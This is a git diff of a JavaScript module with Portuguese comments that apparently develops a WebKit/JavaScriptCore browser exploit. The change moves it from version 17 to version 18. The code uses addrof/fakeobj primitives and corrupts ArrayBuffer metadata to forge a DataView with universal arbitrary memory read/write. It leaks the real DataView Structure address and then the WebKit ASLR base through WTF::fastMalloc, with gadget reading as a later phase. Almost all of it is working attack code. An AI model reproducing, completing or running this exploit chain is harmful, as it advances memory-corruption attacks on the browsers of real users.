@@ -1,11 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v17 - Reordenação de Fases para ARB R/W Universal)
+// js/script3/testArrayBufferVictimCrash.mjs (v18 - Vazamento do Endereço da DataView Structure)
 // =======================================================================================
-// ESTA VERSÃO CORRIGE A ORDEM DE INICIALIZAÇÃO DAS PRIMITIVAS:
+// ESTA VERSÃO CORRIGE A CORRUPÇÃO DO DATA VIEW PARA L/E ARBITRÁRIA UNIVERSAL.
 // 1. Validar primitivas OOB locais.
 // 2. Estabilizar e validar addrof_core/fakeobj_core.
-// 3. NOVO: Configurar e testar a PRIMITIVA DE L/E ARBITRÁRIA UNIVERSAL (via fakeobj DataView) AQUI.
-// 4. Vazar a base ASLR da WebKit usando a agora funcional primitiva de L/E Universal.
-// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
+// 3. NOVO: Vazar o ENDEREÇO REAL da JSC::Structure de DataView do heap JS.
+// 4. Configurar e testar a PRIMITIVA DE L/E ARBITRÁRIA UNIVERSAL (via fakeobj DataView) usando o endereço REAL.
+// 5. Vazar a base ASLR da WebKit usando a agora funcional primitiva de L/E Universal.
+// 6. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -26,7 +27,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v17 - Reordenação de Fases para ARB R/W Universal";
+export const FNAME_MODULE = "v18 - Vazamento do Endereço da DataView Structure";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -85,8 +86,8 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8); // usa arb_read local
-    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8); // usa arb_write local
+    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
+    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
 
     let result = null;
     try {
@@ -102,7 +103,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
             default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
         }
     } finally {
-        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8); // usa arb_write local
+        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
     return result;
 }
@@ -116,8 +117,8 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8); // usa arb_read local
-    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8); // usa arb_write local
+    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
+    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
 
     try {
         switch (byteLength) {
@@ -132,7 +133,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
             default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
         }
     } finally {
-        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8); // usa arb_write local
+        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
     return value;
 }
@@ -159,27 +160,28 @@ function _int64ToDouble_direct(int64) {
  * @param {Function} logFn Função de log.
  * @param {Function} pauseFn Função de pausa.
  * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
- * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
+ * @param {AdvancedInt64} dataViewStructureAddress O endereço REAL da JSC::Structure do DataView no heap.
  * @param {number} m_mode_to_try O valor de m_mode a ser testado.
  * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
  */
-async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
+async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureAddress, m_mode_to_try) {
     const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
-    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);
+    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)} (usando DataView Structure REAL: ${dataViewStructureAddress.toString(true)})...`, "subtest", FNAME);
 
-    _fake_data_view = null; // Garante que a global _fake_data_view seja resetada
-    let backing_array_buffer = null; // Variável local para o buffer de apoio desta tentativa
+    _fake_data_view = null;
+    let backing_array_buffer = null;
 
     try {
         // Criar um ArrayBuffer real que será corrompido para se tornar um DataView forjado.
         backing_array_buffer = new ArrayBuffer(0x1000);
         hold_objects.push(backing_array_buffer);
-        const backing_ab_addr = addrof_core(backing_array_buffer); // Usar a addrof_core estabilizada
+        const backing_ab_addr = addrof_core(backing_array_buffer);
+
         logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);
 
-        // Corromper os metadados do backing_array_buffer usando arb_write local (que já foi validado na FASE 0).
-        // 1. Corromper o ponteiro da Structure (JSCell.STRUCTURE_POINTER_OFFSET) para o vtable da DataView Structure.
-        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
+        // Corromper os metadados do backing_array_buffer usando arb_write local.
+        // 1. Corromper o ponteiro da Structure (JSCell.STRUCTURE_POINTER_OFFSET) para o endereço REAL da DataView Structure.
+        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureAddress, 8);
         // 2. Definir o ponteiro de dados (ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET) para 0 (nulo) inicialmente.
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8);
         // 3. Definir o tamanho em bytes (ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START) para o máximo (0xFFFFFFFF).
@@ -189,9 +191,10 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);
 
         // Criar o DataView forjado usando a primitiva fakeobj_core.
+        // Agora, o backing_array_buffer DEVE se tornar um DataView.
         _fake_data_view = fakeobj_core(backing_ab_addr);
         if (!(_fake_data_view instanceof DataView)) {
-            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
+            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Tipo retornado: ${Object.prototype.toString.call(_fake_data_view)} (Construtor: ${_fake_data_view?.constructor?.name})`, "error", FNAME);
             return false;
         }
         logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);
@@ -237,7 +240,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
             const index = hold_objects.indexOf(backing_array_buffer);
             if (index > -1) { hold_objects.splice(index, 1); }
         }
-        _fake_data_view = null; // Reseta a referência global para garantir que o próximo teste comece limpo
+        _fake_data_view = null;
     }
 }
 
@@ -382,41 +385,43 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
-        // --- FASE 3: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---
-        // ESTA FASE FOI MOVIDA PARA CÁ para ser executada APÓS addrof/fakeobj estarem estáveis.
-        logFn("--- FASE 3: Configurando a PRIMITIVA DE L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");
+        // --- FASE 3: Vazamento do Endereço da DataView Structure e Configuração da Primitiva Universal ARB R/W ---
+        logFn("--- FASE 3: Vazamento do Endereço da DataView Structure e Configuração da Primitiva Universal ARB R/W ---", "subtest");
 
-        // Precisamos do endereço do vtable da DataView Structure para corromper o ArrayBuffer que será forjado.
-        // Já foi lido da config, mas aqui precisamos da base ASLR.
-        // O ASLR ainda não foi vazado, então usaremos um valor temporário para forjar.
-        // A verdadeira configuração para a L/E Universal virá após o vazamento de ASLR.
-        // A lógica de `attemptUniversalArbitraryReadWriteWithMMode` está dentro da FASE 4.
+        // 1. Crie um DataView real para obter o endereço da sua Structure.
+        const real_data_view = new DataView(new ArrayBuffer(8)); // Pequeno DataView real
+        hold_objects.push(real_data_view); // Garante que não seja coletado
+        const real_data_view_addr = addrof_core(real_data_view);
+        logFn(`[DV STRUCTURE LEAK] Endereço do DataView real: ${real_data_view_addr.toString(true)}`, "info");
 
-        // O que precisamos AQUI é garantir que `_fake_data_view` seja criado para que `arb_read_universal_js_heap` possa ser usado.
-        // A forma como `_fake_data_view` é criado é via `attemptUniversalArbitraryReadWriteWithMMode`.
-        // Essa função precisa do `dataViewStructureVtableAddress`.
+        // 2. Leia o ponteiro da Structure desse DataView real usando arb_read (local).
+        const data_view_structure_pointer_offset = real_data_view_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+        const data_view_structure_address = await arb_read(data_view_structure_pointer_offset, 8); // Ponteiro REAL para a DataView Structure
 
-        // PRIMEIRA FORMA DE OBTER O `_fake_data_view`: Com um endereço temporário para a DataView Structure vtable.
-        // A real base ASLR será vazada na FASE 4.
-        const FAKE_DATAVIEW_STRUCTURE_VTABLE_OFFSET = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
-        // Usar um endereço de vtable que não é 0 para evitar erros. O valor real não importa AQUI.
-        // Ele será reconfigurado após o ASLR leak.
-        const DUMMY_DATA_VIEW_STRUCTURE_VTABLE_ADDRESS = new AdvancedInt64(FAKE_DATAVIEW_STRUCTURE_VTABLE_OFFSET, 0x01000000); // Exemplo de endereço temporário.
+        if (!isAdvancedInt64Object(data_view_structure_address) || data_view_structure_address.equals(AdvancedInt64.Zero)) {
+            const errMsg = `Falha na leitura do endereço da DataView Structure: ${data_view_structure_address.toString(true)}. Abortando exploração.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn(`[DV STRUCTURE LEAK] Endereço REAL da DataView Structure: ${data_view_structure_address.toString(true)}`, "leak");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
+
+        // 3. Configure a primitiva Universal ARB R/W usando o endereço REAL da DataView Structure.
         const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
         let universalRwConfigSuccess = false;
 
         for (const candidate_m_mode of mModeCandidates) {
-            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando configurar _fake_data_view com m_mode: ${toHex(candidate_m_mode)} (usando vtable dummy)...`, "info");
+            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando configurar _fake_data_view com m_mode: ${toHex(candidate_m_mode)} (usando vtable REAL)...`, "info");
             universalRwConfigSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                 logFn,
                 pauseFn,
                 JSC_OFFSETS_PARAM,
-                DUMMY_DATA_VIEW_STRUCTURE_VTABLE_ADDRESS, // Usar o endereço dummy aqui
+                data_view_structure_address, // USANDO O ENDEREÇO REAL AQUI
                 candidate_m_mode
             );
             if (universalRwConfigSuccess) {
-                found_m_mode = candidate_m_mode; // Guarda o m_mode que funcionou
+                found_m_mode = candidate_m_mode;
                 logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: _fake_data_view configurado com m_mode: ${toHex(found_m_mode)}.`, "good");
                 break;
             } else {
@@ -430,11 +435,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
-        logFn("Primitiva de L/E Arbitrária Universal (_fake_data_view) CONFIGURADA com sucesso (com vtable dummy).", "good");
+        logFn("Primitiva de L/E Arbitrária Universal (_fake_data_view) CONFIGURADA com sucesso (com vtable REAL).", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
-        // TESTE DE SANIDADE IMEDIATA DA ARB R/W UNIVERSAL (MOVIDO PARA CÁ)
-        // Antes de tentar vazar ASLR, validar se a primitiva arb_read_universal_js_heap funciona.
+
+        // TESTE DE SANIDADE DA ARB R/W UNIVERSAL (MOVIDO PARA CÁ)
         const heap_buffer_for_arb_test = new ArrayBuffer(0x100);
         hold_objects.push(heap_buffer_for_arb_test);
         const heap_buffer_addr = addrof_core(heap_buffer_for_arb_test);
@@ -459,7 +464,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const fast_malloc_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["WTF::fastMalloc"], 16), 0);
         
         logFn(`[ASLR LEAK] Tentando ler o endereço de WTF::fastMalloc (offset: ${fast_malloc_offset.toString(true)}) usando arb_read_universal_js_heap.`, "info");
-        const fast_malloc_address_leak = await arb_read_universal_js_heap(fast_malloc_offset, 8, logFn); // Usar a primitiva universal para ler da lib
+        const fast_malloc_address_leak = await arb_read_universal_js_heap(fast_malloc_offset, 8, logFn);
 
         if (!isAdvancedInt64Object(fast_malloc_address_leak) || fast_malloc_address_leak.equals(AdvancedInt64.Zero) || fast_malloc_address_leak.equals(AdvancedInt64.NaNValue)) {
             const errMsg = `Falha na leitura do endereço de WTF::fastMalloc: ${fast_malloc_address_leak.toString(true)}. Abortando ASLR leak.`;
@@ -490,7 +495,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
-        // --- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---
         logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
         const rwTestPostLeakStartTime = performance.now();
 
